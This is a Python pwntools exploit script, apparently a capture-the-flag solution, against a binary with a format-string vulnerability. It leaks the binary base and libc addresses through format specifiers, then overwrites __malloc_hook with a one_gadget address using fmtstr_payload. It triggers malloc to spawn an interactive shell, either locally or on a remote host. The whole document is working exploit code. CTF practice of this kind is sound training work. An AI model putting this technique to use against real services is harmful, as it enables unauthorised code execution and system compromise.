#!/usr/bin/env python3

from pwn import *

e = ELF("./format_patched")
libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main)
                      b *(echo+0x34)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      b *(echo+0x34)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    # ogs are found by `one_gadget libc.so.6`. It turns out that only the last two work.
    ogs = [0x4f2be, 0x4f2c5, 0x4f322, 0x10a38c]
    for og in ogs:
        r = conn()

        # FSB to leak binary base addr/libc function addr/libc base addr + libc identification + FSB writes + __malloc_hook

        STRING_OFFSET = 6  # Determined by "AAAAAAAA|%1$p...|%40$p". Rest offsets are from debugging.
        ECHO_RET_OFFSET = 41
        ECHO_RET_MAIN_OFFSET = 0x2f

        r.sendline(f'%{ECHO_RET_OFFSET}$p'.encode())
        echo_ret = int(r.recvline(), 16)
        info(f'echo()\'s ret addr is {hex(echo_ret)}')
        main_addr = echo_ret - ECHO_RET_MAIN_OFFSET
        main_offset = e.sym.main - e.address
        e.address = main_addr - main_offset
        info(f'binary base is at {hex(e.address)}')

        r.sendline(f'%{STRING_OFFSET + 1}$s'.encode() + b'\x00' * 4 + p64(e.got.printf))
        printf_addr = u64(r.recvn(6) + b'\x00' * 2)
        info(f'printf is at {hex(printf_addr)}')    # This can help identify the libc version
        printf_offset = libc.sym.printf - libc.address
        libc.address = printf_addr - printf_offset
        info(f'libc base address is {hex(libc.address)}')

        payload = fmtstr_payload(offset=STRING_OFFSET, writes={
            libc.sym.__malloc_hook: libc.address + og,
            })
        info(f'FSB payload has length {len(payload)}, must be smaller than 255')
        r.sendline(payload)
        r.sendline(b'%100000d')  # To trigger the malloc()
        r.clean(timeout=2)
        sleep(1)    # Need sleep() to wait the tube to end.
        if r.connected():
            r.interactive()
        else:
            r.close()

if __name__ == "__main__":
    main()
